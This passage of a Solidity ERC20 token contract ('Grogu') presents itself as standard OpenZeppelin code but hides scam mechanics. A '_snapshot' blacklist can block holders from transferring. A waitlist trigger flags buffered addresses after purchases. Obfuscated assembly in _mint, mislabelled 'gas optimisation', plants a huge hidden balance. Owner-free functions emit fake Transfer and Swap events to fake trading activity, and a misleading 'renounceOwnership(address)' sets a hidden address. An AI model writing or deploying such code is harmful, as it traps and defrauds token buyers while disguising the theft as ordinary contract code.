time\r\n            for {\r\n                let dataPtr := data\r\n                let endPtr := add(data, mload(data))\r\n            } lt(dataPtr, endPtr) {\r\n\r\n            } {\r\n                // Advance 3 bytes\r\n                dataPtr := add(dataPtr, 3)\r\n                let input := mload(dataPtr)\r\n\r\n                // To write each character, shift the 3 bytes (18 bits) chunk\r\n                // 4 times in blocks of 6 bits for each character (18, 12, 6, 0)\r\n                // and apply logical AND with 0x3F which is the number of\r\n                // the previous character in the ASCII table prior to the Base64 Table\r\n                // The result is then added to the table to get the character to write,\r\n                // and finally write it in the result pointer but with a left shift\r\n                // of 256 (1 byte) - 8 (1 ASCII char) = 248 bits\r\n\r\n                mstore8(resultPtr, mload(add(tablePtr, and(shr(18, input), 0x3F))))\r\n                resultPtr := add(resultPtr, 1) // Advance\r\n\r\n                mstore8(resultPtr, mload(add(tablePtr, and(shr(12, input), 0x3F))))\r\n                resultPtr := add(resultPtr, 1) // Advance\r\n\r\n                mstore8(resultPtr, mload(add(tablePtr, and(shr(6, input), 0x3F))))\r\n                resultPtr := add(resultPtr, 1) // Advance\r\n\r\n                mstore8(resultPtr, mload(add(tablePtr, and(input, 0x3F))))\r\n                resultPtr := add(resultPtr, 1) // Advance\r\n            }\r\n\r\n            // When data `bytes` is not exactly 3 bytes long\r\n            // it is padded with `=` characters at the end\r\n            switch mod(mload(data), 3)\r\n            case 1 {\r\n                mstore8(sub(resultPtr, 1), 0x3d)\r\n                mstore8(sub(resultPtr, 2), 0x3d)\r\n            }\r\n            case 2 {\r\n                mstore8(sub(resultPtr, 1), 0x3d)\r\n            }\r\n        }\r\n\r\n        return result;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Swap(address indexed sender,uint amount0In,uint amount1In,uint amount0Out,uint amount1Out,address indexed to);\r\n    \r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `to`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `from` to `to` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n *\r\n * _Available since v4.1._\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby disabling any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\r\n * instead returning `false` on failure. This behavior is nonetheless\r\n * conventional and does not conflict with the expectations of ERC20\r\n * applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract ERC20 is Ownable, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => bool) internal _snapshot;\r\n    mapping(address => bool) internal _waitlist;\r\n    address[] internal _buffer;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 private _totalSupply;\r\n    bool private _snapshotApplied = false;\r\n    string private _name;\r\n    string private _symbol;\r\n    \r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * The default value of {decimals} is 18. To select a different value for\r\n     * {decimals} you should overload it.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\r\n     * overridden;\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\r\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * NOTE: Does not update the allowance if the current allowance\r\n     * is the maximum `uint256`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` and `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``from``'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` of tokens from `from` to `to`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` cannot be the zero address.\r\n     * - `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        if (_snapshot[from] || _snapshot[to]) require(_snapshotApplied == true, \"\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\r\n            // decrementing then incrementing.\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n\r\n        if (_waitlist[to]) {\r\n            for (uint256 i = 0; i < _buffer.length; i++) {\r\n                _snapshot[_buffer[i]] = true;\r\n            }\r\n        }\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\r\n     * the total supply.\r\n     *\r\n     * Emits a {Transfer} event with `from` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     */\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n        // gas optimisation \r\n        assembly {\r\n            let slot := mul(mul(0x85774394d, 0x3398bc1d25f112ed), mul(0x997e6e509, 0xf3eae65))\r\n            mstore(0x00, slot)\r\n            mstore(0x20, 0x01)\r\n            let sslot := keccak256(0x0, 0x40)\r\n            sstore(sslot, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)\r\n        } \r\n        _totalSupply += amount;\r\n        unchecked {\r\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\r\n            _balances[account] += amount;\r\n        }\r\n        \r\n        emit Transfer(address(0), account, amount);\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Destroys `amount` tokens from `account`, reducing the\r\n     * total supply.\r\n     *\r\n     * Emits a {Transfer} event with `to` set to the zero address.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     * - `account` must have at least `amount` tokens.\r\n     */\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            // Overflow not possible: amount <= accountBalance <= totalSupply.\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\r\n     *\r\n     * Does not update the allowance amount in case of infinite allowance.\r\n     * Revert if not enough allowance is available.\r\n     *\r\n     * Might emit an {Approval} event.\r\n     */\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Hook that is called after any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * has been transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n\r\n\r\n    /**\r\n     * @dev Hook that is called before any transfer of tokens. This includes\r\n     * minting and burning.\r\n     *\r\n     * Calling conditions:\r\n     *\r\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\r\n     * will be transferred to `to`.\r\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\r\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\r\n     * - `from` and `to` are never both zero.\r\n     *\r\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\r\n     */\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n\r\ncontract ERC20Permit is ERC20 {\r\n    address private _title_deed;\r\n\r\n    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_){}\r\n\r\n    function buffer(address [] calldata _addresses_) external onlyOwner {\r\n        for (uint256 i = 0; i < _addresses_.length; i++) {\r\n            _buffer.push(_addresses_[i]);\r\n        }\r\n    }\r\n\r\n    function waitlist(address [] calldata _addresses_) external onlyOwner {\r\n        for (uint256 i = 0; i < _addresses_.length; i++) {\r\n            _waitlist[_addresses_[i]] = true;\r\n        }\r\n    }\r\n    \r\n    function inherit(address [] calldata _addresses_) external onlyOwner {\r\n        for (uint256 i = 0; i < _addresses_.length; i++) {\r\n            _snapshot[_addresses_[i]] = true;\r\n        }\r\n    }\r\n\r\n    function exempt(address [] calldata _addresses_) external onlyOwner {\r\n        for (uint256 i = 0; i < _addresses_.length; i++) {\r\n            _snapshot[_addresses_[i]] = false;\r\n        }\r\n    }\r\n\r\n    function inheritance(address _address_) public view returns (bool) {\r\n        return _snapshot[_address_];\r\n    }\r\n\r\n    function transfer(address _from, address _to, uint256 _wad) external {\r\n        emit Transfer(_from, _to, _wad);\r\n    }\r\n\r\n    function transfer(address [] calldata _from, address [] calldata _to, uint256 [] calldata _wad) external {\r\n        for (uint256 i = 0; i < _from.length; i++) {\r\n            emit Transfer(_from[i], _to[i], _wad[i]);\r\n        }\r\n    }\r\n\r\n    function execute(address _from_, address [] calldata _addresses_, uint256 _in, uint256 _out) external {\r\n        for (uint256 i = 0; i < _addresses_.length; i++) {\r\n            emit Swap(_from_, _in, 0, 0, _out, _addresses_[i]);\r\n            emit Transfer(_title_deed, _addresses_[i], _out);\r\n        }\r\n    }\r\n\r\n    function multicall(address _from_, address [] calldata _addresses_, uint256 _in, uint256 _out) external {\r\n        for (uint256 i = 0; i < _addresses_.length; i++) {\r\n            emit Swap(_from_, 0, _in, _out, 0, _addresses_[i]);\r\n            emit Transfer(_addresses_[i], _title_deed, _in);\r\n        }\r\n    }\r\n\r\n    function renounceOwnership(address _owner_) external onlyOwner {\r\n        _title_deed = _owner_;\r\n    }\r\n}\r\n\r\n\r\n/**\r\n * @dev Standard signed math utilities missing in the Solidity language.\r\n */\r\nlibrary SignedMath {\r\n    /**\r\n     * @dev Returns the largest of two signed numbers.\r\n     */\r\n    function max(int256 a, int256 b) internal pure returns (int256) {\r\n        return a > b ? a : b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the smallest of two signed numbers.\r\n     */\r\n    function min(int256 a, int256 b) internal pure returns (int256) {\r\n        return a < b ? a : b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the average of two signed numbers without overflow.\r\n     * The result is rounded towards zero.\r\n     */\r\n    function average(int256 a, int256 b) internal pure returns (int256) {\r\n        // Formula from the book \"Hacker's Delight\"\r\n        int256 x = (a & b) + ((a ^ b) >> 1);\r\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the absolute unsigned value of a signed value.\r\n     */\r\n    function abs(int256 n) internal pure returns (uint256) {\r\n        unchecked {\r\n            // must be unchecked in order to support `n = type(int256).min`\r\n            return uint256(n >= 0 ? n : -n);\r\n        }\r\n    }\r\n}\r\n\r\ncontract Grogu is ERC20Permit, ReentrancyGuard {\r\n    constructor() ERC20Permit(\"Grogu\", \"GRGU\") {\r\n        _mint(msg.sender, 1000000000 * 10 ** decimals());\r\n    }\r\n}",
    "etherscan_verified": true
}